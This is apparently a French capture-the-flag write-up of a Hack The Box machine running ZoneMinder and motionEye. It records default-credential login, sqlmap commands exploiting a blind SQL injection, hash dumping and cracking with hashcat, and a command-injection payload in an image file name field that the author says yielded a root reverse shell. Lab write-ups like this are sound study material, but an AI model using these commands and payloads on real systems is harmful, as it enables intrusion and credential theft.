@@ -1,0 +1,169 @@
+pifpafpouf nmap:
+┌──(kali㉿kali)-[~/Documents/cctv]
+└─$ nmap -p- -sV 10.129.6.36  
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 08:26 -0400
+Nmap scan report for 10.129.6.36
+Host is up (0.019s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
+
+il y a les deux ports classiques, allons donc sur le port 80
+
+        
+┌──(kali㉿kali)-[~/Documents/cctv]
+└─$ curl -v http://10.129.6.36                
+*   Trying 10.129.6.36:80...
+* Established connection to 10.129.6.36 (10.129.6.36 port 80) from 10.10.14.107 port 50496 
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: 10.129.6.36
+> User-Agent: curl/8.18.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 302 Found
+< Date: Mon, 09 Mar 2026 12:31:30 GMT
+< Server: Apache/2.4.58 (Ubuntu)
+< Location: http://cctv.htb/
+< Content-Length: 277
+< Content-Type: text/html; charset=iso-8859-1
+
+j'ajoute le nom de domaine au /etc/hosts
+
+on arrive sur une page de CCTV, comme l'indique le nom de la box, nommée "SecureVision" il y a un gros boutton rouge nommé "staff login", qui mène vers une interface "ZoneMinder" avec une page de login.
+je cherche vitefait un cve et je trouves pas, et rapidement je me dis que souvent dans les CCTV on parle de mdp par défaut, et effectivement en cherchant sur internet je tombes sur admin:admin qui fonctionne.
+j'arrive sur la page avec tout les settings, souvent dans ces cas là (surtout dans les box faciles) la solution c'est d'associer une commande qui fait un reverseshell a un event de la machine. mais avant de fouiller les parametres je vois sur le pannel que la version de l'application m'est indiquée v1.37.63, je vais donc faire un tour sur le github pour voir si les updates qui suivent me parlent d'une faille corrigée par la suite. je ne trouves rien (a part un gap suspicieux entre la version 1.36 et 1.38 dans les releases), je cherches quand même sur google et je tombes sur
+https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3
+directement sur le github de zoneminder qui parle d'une injection SQL
+"ZoneMinder v1.37.* <= 1.37.64 is vulnerable to boolean-based SQL Injection in function of web/ajax/event.php."
+la faille se situe ici 
+http://hostname_or_ip/zm/index.php?view=request&request=event&action=removetag&tid=1
+j'utilise sqlmap pour exploiter, j'ai tenté a la main mais c'est du blind sqlinjection donc flemme,
+sqlmap -r ./sql.burp -p tid
+sqlmap -r ./sql.burp -p tid --sql-shell
+
+une fois la faille identifiée, j'eunumere les tables
+└─$ sqlmap -r ./sql.burp -p tid --common-tables
+<current>
+[6 tables]
++-----------+
+| Config    |
+| States    |
+| Users     |
+| Language  |
+| geo_lake  |
+| kategorie |
++-----------+
+
+en voulant faire un SELECT * FROM Users je tombes sqlmap est obligé de lister les colonnes 
+
+┌──(kali㉿kali)-[~/Documents/cctv]
+└─$ sqlmap -r ./sql.burp -p tid --sql-shell    
+
+[11:34:42] [INFO] adjusting time delay to 1 second due to good response times
+[11:34:42] [ERROR] invalid character detected. retrying..
+[11:34:42] [WARNING] increasing time delay to 2 seconds
+20
+[11:34:48] [INFO] retrieved: Id
+[11:35:01] [INFO] retrieved: Username
+[11:35:50] [INFO] retrieved: Password
+
+j'ai arreté la commande la (car super long en blind) et j'ai eu ce qu'il me failait pour reduire le nombre de characteres a retrouver 
+
+dans le --sql-shell je fais :
+SELECT Username, Password FROM Users;
+
+puis j'attends bcp de sec par characteres c'est long...
+
+je recupere entre autre
+mark
+$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. 
+
+et une fois dans hashcat je tombes sur mark:opensesame
+
+et ça fonctionne pour me connecter en ssh, bizarement je tombes pas sur le user.txt dans le home
+
+mark@cctv:/home$ ls -la
+total 16
+drwxr-xr-x  4 root    root    4096 Mar  2 09:49 .
+drwxr-xr-x 23 root    root    4096 Mar  2 09:49 ..
+drwxr-x---  5 mark    mark    4096 Mar  2 09:49 mark
+drwxr-x---  4 sa_mark sa_mark 4096 Mar  2 09:49 sa_mark
+
+sa_mark me fait penser au 3e user de la db (superadmin) dont je suis toujours entrain de dump le hash au moment ou j'écris ces lignes j'espère donc qu'une fois le hash dump il y aura du password reuse qui me permettera d'acceder au compte (si je peux le crack)
+
+┌──(kali㉿kali)-[~/Documents/cctv]
+└─$ echo '$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m' > hash.txt
+
+┌──(kali㉿kali)-[~/Documents/cctv]
+└─$ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt            
+
+$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m:admin
+
+sa_mark:admin ne fonctionne pas pour se connecter malheureusement
+
+je trouves le dossier de zoneminder et j'essaie de choper des infos ici
+mark@cctv:/usr/share/zoneminder/www$
+
+je trouves pas grand chose mais je vois qu'il y a pleins de ports ouverts en interne donc je setup un tunnel avec ligolo
+sur le port 7999 je tombes sur une interface nommée Motion, en recherchant des confs avec find sur le pc je tombes sur ça:
+
+mark@cctv:/tmp$ cat /etc/motioneye/motion.conf
+# @admin_username admin
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @lang en
+# @enabled on
+# @normal_password 
+
+
+setup_mode off
+webcontrol_port 7999
+webcontrol_interface 1
+webcontrol_localhost on
+webcontrol_parms 2
+
+camera camera-1.conf
+
+le mdp marche tjrs pas pour sa_mark
+
+je trouves aussi
+cat /etc/motioneye/motioneye.conf
+[...]
+# (0.0.0.0 for all interfaces, 127.0.0.1 for localhost)                                                                                                                                                                                     
+listen 127.0.0.1           
+         
+# the TCP port to listen on
+port 8765
+[...]
+
+effectivement une interface est présente ici et me demande un mdp
+
+ET JE PEUX ME CO AVEC LES IDENTIFIANTS DE L'AUTRE FICHIER admin:989c5a8ee87a0e9521ec81a79187d162109282f0
+dessus je tombes sur une webcam qui diffuse une video noire pas tres interesante
+
+en cherchant sur internet je trouves au moins deux CVE qui donnent un RCE avec motioneye, j'arrive pas a connaitre la version exacte de celui que j'ai mais j'essaye a l'aveugle
+je teste ça (une injection de commande dans le systeme de screenshot automatique)
+https://github.com/advisories/GHSA-j945-qm58-4gjx
+
+je cite:
+Inject Payload
+
+    Set Capture Mode: Interval Snapshots
+    Set Interval: 10
+    Set Image File Name to the payload:
+
+    $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
+
+
+en remplacant le touch par un reverse shell BINGO j'ai un terminal qui pop sur mon netcat, un terminal.... root ?
+bon bah j'ai pas trop compris j'ai directe le root, donc je vais chercher le rootflag dans le dossier root et après je vais chercher l'userflag dans le home de sa_mark, j'ai peut être loupé une étape mais bon... terminé !
+
+CONCLUSIONS:
+c'était pas très compliqué, j'ai pas grand chose a dire, j'ai pas pris un plaisir enorme, l'injection SQL était irréalisable a la main vu qu'elle était time base donc j'ai juste patienté un temps infini avec sqlmap (pas le plus fun), et après les deux flags étaient donnés un peu n'importe comment, je sais pas si j'ai loupé un truc.
